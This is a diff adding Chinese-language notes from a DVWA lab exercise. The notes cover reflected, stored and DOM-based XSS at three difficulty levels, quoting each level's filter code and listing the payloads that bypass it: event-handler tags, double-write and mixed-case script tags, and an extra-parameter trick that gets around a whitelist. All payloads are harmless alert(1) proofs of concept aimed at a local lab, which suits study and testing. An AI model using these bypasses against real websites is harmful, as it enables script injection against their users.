@@ -1,0 +1,68 @@
+### XSS跨站脚本-DVWA-实操-反射型XSS
+（LOW）低级
+<script>alert(1)</script>
+<svg onload=alert(1)>
+<svg onmouseover=alert(1)>
+low级别没有防护措施，基本任何方法都能实现
+
+（Medium）中级
+$name = str_replace( '<script>', '', $_GET[ 'name' ] );
+源代码做了一个简单的黑名单过滤
+<scr<script>ipt>alert(1)</scr<script>ipt>      #双写嵌入绕过
+<ScRiPt>alert(1)</sCrIpT>     #大小写混合绕过
+HTML标签也能绕过
+
+（High）高级
+$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
+源代码做了<script 循环检查限制，<script>标签限制
+<svg onmouseover=alert(1)>       #onmouseover 事件（鼠标滑过除法）
+<img src=x onerror=alert(1)>      #onerror 事件（配合<img>）
+<body onload=alert(1)>    #页面完全加载触发
+
+### XSS跨站脚本-DVWA-实操-存储型XSS
+（LOW）级别
+###low级别没有防护措施，基本任何方法都能实现,Name被限制，可以直接F12修改maxlength长度,Message可以随意提交
+<script>alert(1)</script>
+<svg onload=alert(1)>
+<svg onmouseover=alert(1)>
+
+（Medium）中级
+###medium级别message做了防护，基本上很难绕过，但是还可以在后续思考一下方法，这里name做了一个简单黑名单
+$name = str_replace( '<script>', '', $name );
+可以直接F12修改maxlength长度，或者burp suite抓包修改
+<scr<script>ipt>alert(1)</scr<script>ipt>      #双写嵌入绕过
+<ScRiPt>alert(1)</sCrIpT>     #大小写混合绕过
+HTML标签也能绕过
+
+（High）高级
+###high级别message防护没变，name防护变化了一下
+$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name )；
+<scirpt>标签被限制了就换其他标签和事件绕过，还是可以根据F12修改maxlength长度，或者burp suite抓包修改
+<svg onmouseover=alert(1)>       #onmouseover 事件（鼠标滑过除法）
+<img src=x onerror=alert(1)>      #onerror 事件（配合<img>）
+<body onload=alert(1)>    #页面完全加载触发
+<input type="text" onclick="alert(1)">       #onclick 事件（点击触发）
+
+### XSS跨站脚本-DVWA-实操-DOM型XSS
+（LOW）级别
+###low级别没有防护措施，但是是网页直接提交，或者用burp suite抓包工具
+http://127.0.0.1:8888/dvwa/vulnerabilities/xss_d/?default=English     修改English值
+<script>alert(1)</script>
+<svg onload=alert(1)>
+
+（Medium）级别
+###medium级别做了一个包含子串<script(不区分大小写）的一个过滤机制重定向
+if (stripos ($default, "<script") !== false）
+<img src=x onerror=alert(1)>      #onerror 事件（配合<img>）
+<body onload=alert(1)>    #页面完全加载触发
+<input type="text" onclick="alert(1)">       #onclick 事件（点击触发）
+
+（High）高级
+高级是白名单机制，default=English&name=<script>中，后端只检查default是否在白名单内，而name参数后端没做任何检查，直接传给前端，
+default=English&<script>alert(1)</script>
+default=English&<img src=x onerror=alert(1)>      #onerror 事件（配合<img>）
+default=English&<body onload=alert(1)>    #页面完全加载触发
+default=English&<input type="text" onclick="alert(1)">       #onclick 事件（点击触发）
+
+<input type="text" onclick="alert(1)">       #onclick 事件（点击触发）
+
